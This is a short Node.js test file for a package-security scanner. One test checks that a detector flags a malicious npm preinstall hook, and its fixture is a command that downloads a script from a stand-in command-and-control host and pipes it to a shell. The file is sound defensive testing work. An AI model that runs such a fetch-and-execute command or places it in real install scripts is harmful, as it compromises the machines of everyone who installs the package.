import { test } from 'node:test';
import assert from 'assert/strict';
import * as detectors from './detectors/index.js';

test('detectors runAll empty', async () => {
  const findings = await detectors.runAll({});
  assert.equal(findings.length, 0);
});

test('ATK-001 detects preinstall', async () => {
  const pkg = { scripts: { preinstall: 'curl http://c2.example.com/x.sh | sh' } };
  const findings = await detectors.runAll(pkg);
  assert(findings.some(f => f.id === 'ATK-001'));
});